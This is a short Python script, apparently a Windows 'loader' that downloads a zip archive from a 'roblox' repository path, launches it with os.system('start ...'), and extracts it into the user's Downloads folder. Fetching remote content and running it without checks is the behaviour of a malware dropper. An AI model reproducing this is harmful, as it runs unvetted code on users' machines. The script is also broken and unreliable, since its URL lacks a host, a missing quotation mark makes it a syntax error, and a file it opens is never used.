from urllib import request
import os
import subprocess
import time
# Define the remote file to retrieve
remote_url = '/bj0rntje/roblox/archive/refs/heads/main.zip'
# Define the local filename to save data
local_file = 'packaged.zip'
# Download remote and save locally
request.urlretrieve(remote_url, local_file)
f = open("loader.py", "r")
commanding = "start "+local_file
time.sleep(1)
os.system(commanding)
#subprocess.call(commanding)



# importing the zipfile module
from zipfile import ZipFile
  
# loading the temp.zip and creating a zip object
with ZipFile(packaged.zip", 'r') as zObject:
  
    # Extracting all the members of the zip 
    # into a specific location.
    zObject.extractall(
        path="%userprofile%\Downloads\files_in_usage\unpackaged")
hello = input("works!")
